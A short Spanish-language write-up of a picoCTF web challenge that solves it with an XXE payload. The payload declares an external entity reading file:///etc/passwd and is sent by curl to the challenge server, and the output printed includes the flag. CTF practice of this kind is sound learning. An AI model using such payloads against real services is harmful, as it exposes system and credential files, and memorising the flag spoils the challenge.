#notas_hacking #web
# Reto
## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:58371/)
## Solución
Si es vulnerable a `XXE` este `payload` intenta leer el archivo `/etc/passwd` en sistemas Linux y devuelve una respuesta si lo es.
```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >
	]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>
```
por terminal
```bash
┌──(kali㉿kali)-[~/pico]
└─$ curl -s -k -X POST http://saturn.picoctf.net:58371/data  -H 'Content-Type: application/xml'   --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [\x0d\x0a  <!ELEMENT foo ANY >\x0d\x0a  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\x0d\x0a]> <data><ID>&xxe;</ID></data>' | grep pico
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
```
## Notas

## Referencias
